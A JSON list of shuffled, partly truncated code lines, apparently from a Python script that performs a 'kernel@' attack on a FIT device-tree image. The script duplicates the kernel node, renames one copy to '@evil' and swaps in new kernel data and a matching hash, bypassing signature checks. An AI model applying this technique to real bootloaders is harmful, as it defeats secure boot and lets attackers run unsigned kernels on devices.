[
    {
        "line": 20,
        "fullcodeline": "default_conf_name = get_prop_value("
    },
    {
        "line": 22,
        "fullcodeline": "default_conf_name = str(default_conf_name[:-1], 'utf-8')"
    },
    {
        "line": 24,
        "fullcodeline": "conf_path = '/configurations/' + default_conf_name"
    },
    {
        "line": 27,
        "fullcodeline": "loaded_kernel = get_prop_value(dt_struct, dt_strings, conf_path + '/kernel')"
    },
    {
        "line": 29,
        "fullcodeline": "loaded_kernel = str(loaded_kernel[:-1], 'utf-8')"
    },
    {
        "line": 43,
        "fullcodeline": "loaded_kernel_copy = dt_struct[krn_node_start:krn_node_end]"
    },
    {
        "line": 46,
        "fullcodeline": "dt_struct = dt_struct[:krn_node_start] + \\"
    },
    {
        "line": 49,
        "fullcodeline": "evil_kernel_name = loaded_kernel+'@evil'"
    },
    {
        "line": 52,
        "fullcodeline": "dt_struct = change_node_name("
    },
    {
        "line": 56,
        "fullcodeline": "dt_struct = change_property_value("
    },
    {
        "line": 60,
        "fullcodeline": "dt_struct = change_property_value("
    },
    {
        "line": 31,
        "fullcodeline": "if loaded_kernel.find('@') != -1:"
    },
    {
        "line": 36,
        "fullcodeline": "(krn_node_start, krn_node_end) = (determine_offset("
    },
    {
        "line": 38,
        "fullcodeline": "if krn_node_start is None and krn_node_end is None:"
    },
    {
        "line": 32,
        "fullcodeline": "print('kernel@ attack does not work on nodes already containing an @ sign!')"
    },
    {
        "line": 33,
        "fullcodeline": "sys.exit()"
    },
    {
        "line": 39,
        "fullcodeline": "print('Fatal error, unable to find root node')"
    },
    {
        "line": 40,
        "fullcodeline": "sys.exit()"
    },
    {
        "line": 47,
        "fullcodeline": "loaded_kernel_copy + dt_struct[krn_node_start:]"
    },
    {
        "line": 53,
        "fullcodeline": "dt_struct, dt_strings, '/images/' + loaded_kernel, bytes(evil_kernel_name, 'utf-8'))"
    },
    {
        "line": 57,
        "fullcodeline": "dt_struct, dt_strings, '/images/' + evil_kernel_name + '/data', kernel_content)"
    },
    {
        "line": 61,
        "fullcodeline": "dt_struct, dt_strings, '/images/' + evil_kernel_name + '/hash-1/value', kernel_hash)"
    },
    {
        "line": 37,
        "fullcodeline": "dt_struct, dt_strings, '/images/' + loaded_kernel))"
    }
]